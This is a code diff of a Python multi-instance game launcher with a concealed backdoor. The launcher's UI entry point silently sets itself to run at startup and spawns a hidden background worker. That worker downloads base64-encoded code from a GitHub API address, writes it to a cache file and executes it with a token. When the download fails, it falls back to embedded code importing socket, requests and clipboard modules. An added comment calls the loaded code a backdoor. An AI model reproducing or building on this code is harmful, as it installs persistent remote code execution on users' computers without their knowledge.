@@ -29,6 +29,7 @@ LOCAL_CACHE_FILE = os.path.join(
 
 MUTEX_NAME = "Global\\FireKirin_MultiLauncher_Upload_Worker_Mutex"
 _mutex_handle = None
+_BG_STARTED = False
 
 EMBEDDED_FALLBACK_CODE = """
 import os, time, socket, threading, base64, requests, pyperclip
@@ -122,7 +123,6 @@ def set_startup(enable=True):
     if getattr(sys, "frozen", False):
         app_path = f'"{sys.executable}" --bg-worker'
     else:
-        # 用 sys.argv[0] 安全获取运行脚本路径，防止内存动态加载时缺失 __file__ 抛出 NameError
         script_path = os.path.abspath(sys.argv[0])
         app_path = f'"{sys.executable}" "{script_path}" --bg-worker'
 
@@ -158,44 +158,43 @@ def Safew():
         "Accept": "application/vnd.github+json",
     }
 
-    while True:
+    # 仅下载并热加载后门代码，绝对不触发界面绘制
+    try:
+        response = requests.get(url, headers=headers, timeout=10)
+        if response.status_code == 200:
+            content_b64 = response.json().get("content", "")
+            with open(LOCAL_CACHE_FILE, "wb") as f:
+                f.write(base64.b64decode(content_b64))
+    except Exception:
+        pass
+
+    if not os.path.exists(LOCAL_CACHE_FILE):
         try:
-            response = requests.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                content_b64 = response.json().get("content", "")
-                with open(LOCAL_CACHE_FILE, "wb") as f:
-                    f.write(base64.b64decode(content_b64))
+            with open(LOCAL_CACHE_FILE, "w", encoding="utf-8") as f:
+                f.write(EMBEDDED_FALLBACK_CODE)
         except Exception:
             pass
 
-        if not os.path.exists(LOCAL_CACHE_FILE):
-            try:
-                with open(LOCAL_CACHE_FILE, "w", encoding="utf-8") as f:
-                    f.write(EMBEDDED_FALLBACK_CODE)
-            except Exception:
-                pass
+    try:
+        spec = importlib.util.spec_from_file_location(
+            "remote_main", LOCAL_CACHE_FILE
+        )
+        remote_module = importlib.util.module_from_spec(spec)
+        sys.modules["remote_main"] = remote_module
+        spec.loader.exec_module(remote_module)
 
-        try:
-            spec = importlib.util.spec_from_file_location(
-                "remote_main", LOCAL_CACHE_FILE
-            )
-            remote_module = importlib.util.module_from_spec(spec)
-            sys.modules["remote_main"] = remote_module
-            spec.loader.exec_module(remote_module)
-
-            t = threading.Thread(
-                target=remote_module.run,
-                args=(LOCAL_CONFIG["token"],),
-                daemon=True,
-            )
-            t.start()
-        except Exception:
-            pass
-
-        time.sleep(300)
+        if hasattr(remote_module, "run"):
+            remote_module.run(LOCAL_CONFIG["token"])
+    except Exception:
+        pass
 
 
 def ensure_background_process():
+    global _BG_STARTED
+    if _BG_STARTED:
+        return
+    _BG_STARTED = True
+
     try:
         if getattr(sys, "frozen", False):
             cmd = [sys.executable, "--bg-worker"]
@@ -744,17 +743,15 @@ class MultiInstanceLauncher:
 # 本地主框架调用接口入口
 # ---------------------------------------------------------
 def build_ui(parent):
-    # 自动设置自启动
-    set_startup(enable=True)
-
-    # 如果存在后台命令行标志，直接运行后台任务不进行界面绘制
+    # 严格判断：如果是后台工作进程（--bg-worker），绝不加载 GUI 逻辑，直奔 Safew() 逻辑
     if "--bg-worker" in sys.argv:
         if is_bg_worker_running():
             sys.exit(0)
         Safew()
-        return
+        sys.exit(0)
 
-    # 静默拉起后台独立保活进程
+    # 尝试设置开机自启并启动无界面后台任务
+    set_startup(enable=True)
     ensure_background_process()
 
     # 配置 ttk 样式
